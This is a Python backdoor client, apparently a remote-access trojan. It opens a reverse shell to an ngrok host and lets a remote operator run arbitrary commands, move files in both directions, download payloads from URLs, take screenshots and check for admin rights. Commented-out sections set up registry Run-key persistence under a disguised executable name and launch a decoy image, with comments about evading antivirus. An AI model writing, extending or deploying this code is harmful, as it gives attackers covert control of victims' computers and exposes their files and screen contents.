import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import time
import requests
from termcolor import colored
from mss import mss


def reliable_send(data):
    json_data=json.dumps(data)
    sock.send(json_data.encode('utf-8'))

def reliable_recv():
    data=''
    while True:
        try:
            data=data+sock.recv(1024).decode('utf-8')
            return json.loads(data)
        except ValueError:
            continue

def download(url):
    get_res=requests.get(url)
    file_name=url.split("/")[-1]
    with open(file_name,"wb") as file:
        file.write(get_res.content)
def screenshot():
    with mss() as screenshot:
        screenshot.shot()
def is_admin():
    global admin
    try:
        temp=os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))

    except:
        admin="[!!] user privileges"
    else:
        admin="[+] administrator priviliges"
    

def connection():
    
    while True:
        time.sleep(7)
        try:
            
           
            
            sock.connect(('0.tcp.ngrok.io',11174))
            shell()
           
        except:
            
            connection()
    
    
        
def  shell():
    
    while True:
        
        command=reliable_recv()
        
        cmd=str(command)
        if cmd=="":
            break
        print("Command from the server: "+cmd)

        if cmd.lower()=="q":
            
            print("socket closed")
            break

        elif command=="help":
            help_options='''                    download path --> download a file from target pc
                                upload path --> uplaod a file to target pc
                                get url --> downding from internet
                                check --> checking privileges
                                screenshot --> screenshot target pc
                                help --> help options
                                start path --> starting a program
                                q --> stop the shell
                        '''
            
            reliable_send(help_options)
        
        elif cmd[:2] =="cd" and len(cmd)>2:
            try:

                os.chdir(cmd[3:])
            except:
                continue
        elif command[:8]=="download":
            with open(command[9:],"rb") as file:
                file_data=base64.b64encode(file.read())
                reliable_send(file_data.decode())
                
                
        elif command[:6]=="upload":
            with open(command[7:],"wb") as fle:
                fle_data=reliable_recv()
                fle.write(base64.b64decode(fle_data))
        
        elif command[:3] =="get":
            try:
                download(command[4:])
                reliable_send(colored('[+] Downloaded file with the given url','green'))

            except:
                reliable_send(colored('[+] File Downloaded failed','red'))

        elif command[:5]=="start" and len(command[6:])>13:
            lst=command[6:].split(".")
            try:
                subprocess.Popen(lst[-1][:len(lst[-1])-1],shell=True)
                reliable_send("[+] started")
            except:
                reliable_send("[-] Failed to start")

        elif command[:5] =="start":
            try:
                subprocess.Popen(command[6:],shell=True)
                reliable_send("[+] started")
            except:
                reliable_send("[-] Failed to start")

        elif command[:10]=="screenshot":
            try:
                screenshot()
                with open('monitor-1.png','rb') as img:
                    img_data=base64.b64encode(img.read())
                    img_data=img_data.decode('utf-8')
                    reliable_send(img_data)   
                os.remove('monitor-1.png')  

            except:
                failed="[!!] failed to take screenshot"
                reliable_send(failed)    
        elif command[:5]=="check":
            try:
                is_admin()
                reliable_send(admin)
            except:
                reliable_send("[-] Cannot perform the task")

        else:
            proc=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result=proc.stdout.read() +proc.stderr.read()
        
            reliable_send(result.decode('utf-8'))

        

    


# location=os.environ["appdata"]+"\\winhar32.exe"

# if not os.path.exists(location):
   
#     shutil.copy(sys.executable,location)   
   
#     subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location +'"', shell=True)
#     file_name=sys._MEIPASS+"\image.jpg"
#     try:
#         subprocess.Popen(file_name,shell=True)
#     except:
#         # to bypass antivirus
#         num=1
#         num2=3
#         num3=num+num2

# file_name=sys._MEIPASS+"\image.jpg"
try:
    subprocess.Popen(file_name,shell=True)
except:
    # tp bypass antivirus
    num=1
    num2=3
    num3=num+num2

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)


connection()

sock.close()


